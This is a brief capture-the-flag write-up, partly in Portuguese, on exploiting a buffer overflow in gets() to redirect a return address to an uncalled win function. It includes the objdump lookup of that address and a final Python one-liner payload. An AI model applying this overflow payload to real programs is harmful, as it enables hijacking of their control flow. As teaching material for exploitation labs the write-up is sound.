# Challenge `Return_Address` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Buffer overflow
- Where: Where is the vulnerability present
  - Função gets 
- Impact: What results of exploiting this vulnerability
  - Overwrite buffer ter acesso a uma função que não é chamada na main

## Steps to reproduce

1. Precisava de ter acesso a uma funçao que não era chamada na func main então tive de redirecionar o return da func main para ir para a func desejada
2. fui adicionando chars até dar segfault apartir depois escrevi o endereço da func win em little_endian
3. Para obter o enderelo da func win fiz: objdump -x return | grep 
-> 080486f1 g     F .text	00000042              win

Payload final: python -c "print'A'*22+'\xf1\x86\x04\x08'"

